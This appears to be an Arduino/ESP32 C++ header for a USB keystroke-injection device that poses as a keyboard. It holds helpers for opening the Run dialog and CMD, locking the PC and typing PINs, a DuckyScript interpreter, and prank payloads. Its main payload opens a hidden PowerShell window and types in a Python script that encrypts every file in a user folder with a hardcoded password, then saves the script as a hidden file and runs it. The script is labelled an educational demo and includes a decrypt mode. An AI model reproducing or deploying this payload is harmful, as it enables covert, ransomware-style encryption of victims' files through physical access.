#ifndef USB_TOOLS_H
#define USB_TOOLS_H

#include "USB.h"
#include "USBHIDKeyboard.h"
#include "USBHIDMouse.h"
#include "Configs.h"

USBHIDMouse Mouse;
USBHIDKeyboard Keyboard;

//----------------- start USB ---------------------
void startUSB(const char* dev) {
  USB.begin();
  if(dev == "Keyboard") {
    Keyboard.begin();
  }
  else if(dev == "Mouse") {
    Mouse.begin();
  } 
  else if(dev == "Both") {
    Keyboard.begin();
    Mouse.begin();
  } 
  delay(Delay * 30); // Initial pause
}
//----------------- typeLine ---------------------
void typeLine(const char* line) {
  Keyboard.print(line);
  Keyboard.write(KEY_RETURN);
  delay(Delay);
}

//----------------- program ----------------------
void program(const char* Progarm) {
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(Delay * 10);
  typeLine(Progarm);
  delay(Delay * 20); // wait for app to load
}

//---------------- switchBack --------------------
void switchBack() {
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_TAB);
  Keyboard.releaseAll();
  delay(Delay * 3);
}

//------------------ bypass ----------------------
void bypass() {
  // Dismiss popups
  Keyboard.write(KEY_RETURN);
  delay(Delay * 25);

  // Try "Enable Editing"
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('e');
  Keyboard.releaseAll();
  delay(Delay * 50);
}

//----------------- copyPaste --------------------
void copyPaste(char value) {
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(value);
  Keyboard.releaseAll();
  delay(Delay * 3);
}

//------------------- arrow ----------------------
void arrow(char direction) {
  switch (direction) {
    case 'U': Keyboard.write(KEY_UP_ARROW); break;
    case 'D': Keyboard.write(KEY_DOWN_ARROW); break;
    case 'R': Keyboard.write(KEY_RIGHT_ARROW); break;
    case 'L': Keyboard.write(KEY_LEFT_ARROW); break;
  }
  delay(Delay * 3);
}

void waitFor(int ms) {
  delay(ms);
}

void typeText(String text, bool enter = false) {
  Keyboard.print(text);
  if (enter) {
    Keyboard.write(KEY_RETURN);
  }
  waitFor(Delay);
}

void pressCombo(const char* combo) {
  // Example: "CTRL+SHIFT+ESC"
  if (strstr(combo, "CTRL")) Keyboard.press(KEY_LEFT_CTRL);
  if (strstr(combo, "SHIFT")) Keyboard.press(KEY_LEFT_SHIFT);
  if (strstr(combo, "ALT")) Keyboard.press(KEY_LEFT_ALT);
  if (strstr(combo, "GUI")) Keyboard.press(KEY_LEFT_GUI);

  if (strstr(combo, "ESC")) Keyboard.press(KEY_ESC);
  if (strstr(combo, "TAB")) Keyboard.press(KEY_TAB);
  if (strstr(combo, "F4")) Keyboard.press(KEY_F4);
  if (strstr(combo, "L")) Keyboard.press('l'); // For Win+L

  Keyboard.releaseAll();
  waitFor(Delay);
}

//------------------- system actions -------------------------
void openRunDialog() {
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  waitFor(Delay * 10);
}

void openCMD() {
  openRunDialog();
  typeText("cmd", true);
  waitFor(Delay * 20);
}

void openExplorer(const char* path) {
  openRunDialog();
  typeText(path, true);
}

void openBrowser(const char* url) {
  openRunDialog();
  typeText("chrome", true); // change to "msedge" or "firefox"
  waitFor(Delay * 50);
  typeText(url, true);
}

void altTab(int times = 1) {
  for (int i = 0; i < times; i++) {
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(KEY_TAB);
    Keyboard.releaseAll();
    waitFor(Delay * 5);
  }
}

void taskManager() {
  pressCombo("CTRL+SHIFT+ESC");
}

void closeWindow() {
  pressCombo("ALT+F4");
}

void screenshot() {
  Keyboard.write(KEY_PRINT_SCREEN);
  waitFor(Delay * 10);
}

void newDesktop() {
  pressCombo("CTRL+GUI+D");
}

void lockPC() {
  pressCombo("GUI+L");
}

//--------------- Python Script ------------------
void py_script() {
  // Launch PowerShell in hidden window
  program("powershell -WindowStyle Hidden");

  // Set PowerShell variable for target folder path
  String psTargetFolder = String("$targetFolder = \"$env:USERPROFILE\\") + target + "\"";
  typeLine(psTargetFolder.c_str());

  // Export env variable for Python script usage
  typeLine("Set-Item -Path Env:TARGET_FOLDER -Value $targetFolder");

  // Start PowerShell here-string for Python script content
  typeLine("@\"");

  // ---- Python script begins ----
  typeLine("import os, sys, time, base64, shutil, subprocess");
  typeLine("try:");
  typeLine("    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC");
  typeLine("    from cryptography.fernet import Fernet");
  typeLine("    from cryptography.hazmat.primitives import hashes");
  typeLine("    from cryptography.hazmat.backends import default_backend");
  typeLine("except ImportError:");
  typeLine("    print('[!] cryptography not found. Installing...')");
  typeLine("    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'cryptography'])");
  typeLine("    print('[+] Installed. Restarting script...')");
  typeLine("    os.execv(sys.executable, [sys.executable] + sys.argv)");
  typeLine("");
  typeLine("TARGET_FOLDER = os.getenv('TARGET_FOLDER')");
  typeLine("SALT = b'educational_demo_salt!'");
  typeLine("ITERATIONS = 390000");
  typeLine("KEY_FILE = 'keyfile.key'");
  typeLine("KEY_BACKUP_FILE = os.path.expanduser('~/Documents/keyfile_backup.key')");
  typeLine("LOG_FILE = 'encryptor.log'");
  typeLine("PASSWORD = '12345678'");
  typeLine(("MODE = '" + String(pymode) + "'").c_str());
  typeLine("");
  typeLine("def log(msg):");
  typeLine("    with open(LOG_FILE, 'a', encoding='utf-8') as f:");
  typeLine("        f.write(f\"{time.strftime('%Y-%m-%d %H:%M:%S')} - {msg}\\n\")");
  typeLine("    print(msg)");
  typeLine("");
  typeLine("def derive_key(password, salt):");
  typeLine("    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=ITERATIONS, backend=default_backend())");
  typeLine("    return base64.urlsafe_b64encode(kdf.derive(password.encode()))");
  typeLine("");
  typeLine("def save_key(key):");
  typeLine("    with open(KEY_FILE, 'wb') as f: f.write(key)");
  typeLine("    log(f'[+] Key saved to {KEY_FILE}')");
  typeLine("    try:");
  typeLine("        os.makedirs(os.path.dirname(KEY_BACKUP_FILE), exist_ok=True)");
  typeLine("        shutil.copy2(KEY_FILE, KEY_BACKUP_FILE)");
  typeLine("        log(f'[+] Backup key saved to {KEY_BACKUP_FILE}')");
  typeLine("    except Exception as e:");
  typeLine("        log(f'[!] Failed to backup key: {e}')");
  typeLine("");
  typeLine("def load_key():");
  typeLine("    with open(KEY_FILE, 'rb') as f: key = f.read()");
  typeLine("    log(f'[+] Key loaded from {KEY_FILE}')");
  typeLine("    return key");
  typeLine("");
  typeLine("def get_all_files(folder):");
  typeLine("    paths = []");
  typeLine("    for root, _, files in os.walk(folder):");
  typeLine("        for file in files:");
  typeLine("            path = os.path.join(root, file)");
  typeLine("            if os.path.abspath(path) != os.path.abspath(KEY_FILE):");
  typeLine("                paths.append(path)");
  typeLine("    return paths");
  typeLine("");
  typeLine("def progress_bar(current, total):");
  typeLine("    percent = int((current / total) * 100)");
  typeLine("    bar = '#' * (percent // 2) + '-' * (50 - percent // 2)");
  typeLine("    sys.stdout.write(f\"\\r[{bar}] {percent}%\")");
  typeLine("    sys.stdout.flush()");
  typeLine("");
  typeLine("def encrypt_folder(folder, fernet):");
  typeLine("    files = get_all_files(folder)");
  typeLine("    total = len(files)");
  typeLine("    for i, path in enumerate(files, 1):");
  typeLine("        try:");
  typeLine("            with open(path, 'rb') as f: data = f.read()");
  typeLine("            with open(path, 'wb') as f: f.write(fernet.encrypt(data))");
  typeLine("            log(f'[+] Encrypted: {path}')");
  typeLine("        except Exception as e:");
  typeLine("            log(f'[!] Failed to encrypt {path}: {e}')");
  typeLine("        progress_bar(i, total)");
  typeLine("    print()");
  typeLine("");
  typeLine("def decrypt_folder(folder, fernet):");
  typeLine("    files = get_all_files(folder)");
  typeLine("    total = len(files)");
  typeLine("    for i, path in enumerate(files, 1):");
  typeLine("        try:");
  typeLine("            with open(path, 'rb') as f: data = f.read()");
  typeLine("            dec = fernet.decrypt(data)");
  typeLine("            with open(path, 'wb') as f: f.write(dec)");
  typeLine("            log(f'[-] Decrypted: {path}')");
  typeLine("        except Exception as e:");
  typeLine("            log(f'[!] Failed to decrypt {path}: {e}')");
  typeLine("        progress_bar(i, total)");
  typeLine("    print()");
  typeLine("");
  typeLine("if __name__ == '__main__':");
  typeLine("    os.makedirs(TARGET_FOLDER, exist_ok=True)");
  typeLine("    log('=== Safe Dual-Mode Started ===')");
  typeLine("    if os.path.exists(KEY_FILE):");
  typeLine("        log('[*] Key file found.')");
  typeLine("        key = load_key()");
  typeLine("    else:");
  typeLine("        key = derive_key(PASSWORD, SALT)");
  typeLine("        save_key(key)");
  typeLine("    fernet = Fernet(key)");
  typeLine("    if MODE == 'e':");
  typeLine("        encrypt_folder(TARGET_FOLDER, fernet)");
  typeLine("    elif MODE == 'd':");
  typeLine("        decrypt_folder(TARGET_FOLDER, fernet)");
  typeLine("    else:");
  typeLine("        log('[!] Invalid mode.')");
  typeLine("    log('=== Process Finished ===')");
  // ---- Python script ends ----

  // Save Python script to user profile root folder as hidden file
  typeLine("\"@ | Set-Content $env:USERPROFILE\\safe_dual_mode.py");
  typeLine("Set-ItemProperty \"$env:USERPROFILE\\safe_dual_mode.py\" -Name Attributes -Value Hidden");

  // Execute Python script
  typeLine("python $env:USERPROFILE\\safe_dual_mode.py");

  // Exit PowerShell session
  typeLine("exit");

}

//-------------- YouTube Richroll -----------------
void pingSite() {
  program(linkURL);
}

//-------------- Barrel Roll Mode -----------------
void barrelRollMode() {
  program("cmd");
  typeLine("start https://www.google.com/search?q=do+a+barrel+roll");
  typeLine("exit");
}

//--------------- notepad Mode --------------------
void notepadMode() {
  program("notepad");
  typeLine("You have been hacked.");
}

//----------------- pin loop ----------------------
void typePIN(const char* pin) {
  while (*pin) {
    Keyboard.write(*pin);
    delay(1);
    pin++;
  }
}

//---------------- DuckyScript Engine -------------
void runDuckyScript(String script) {
  int start = 0;
  while (true) {
    int end = script.indexOf('\n', start);
    String line = (end == -1) ? script.substring(start) : script.substring(start, end);
    line.trim();
    start = (end == -1) ? script.length() : end + 1;

    if (line.length() == 0 || line.startsWith("REM")) continue;

    // --- Core DuckyScript keywords ---
    if (line.startsWith("STRING ")) {
      String text = line.substring(7);
      Keyboard.print(text);
    }
    else if (line.equalsIgnoreCase("ENTER")) Keyboard.write(KEY_RETURN);
    else if (line.equalsIgnoreCase("TAB")) Keyboard.write(KEY_TAB);
    else if (line.equalsIgnoreCase("ESCAPE")) Keyboard.write(KEY_ESC);
    else if (line.equalsIgnoreCase("SPACE")) Keyboard.write(' ');
    else if (line.startsWith("DELAY ")) {
      int ms = line.substring(6).toInt();
      delay(ms);
    }
    else if (line.startsWith("GUI ")) {
      char key = line.substring(4)[0];
      Keyboard.press(KEY_LEFT_GUI);
      Keyboard.press(key);
      Keyboard.releaseAll();
    }
    else if (line.startsWith("CTRL") || line.startsWith("ALT") || line.startsWith("SHIFT")) {
      if (line.indexOf("CTRL") >= 0) Keyboard.press(KEY_LEFT_CTRL);
      if (line.indexOf("ALT") >= 0) Keyboard.press(KEY_LEFT_ALT);
      if (line.indexOf("SHIFT") >= 0) Keyboard.press(KEY_LEFT_SHIFT);
      if (line.indexOf("DEL") >= 0) Keyboard.press(KEY_DELETE);
      if (line.indexOf("ESC") >= 0) Keyboard.press(KEY_ESC);
      Keyboard.releaseAll();
    }
    delay(Delay);
    if (end == -1) break;
  }
}

#endif
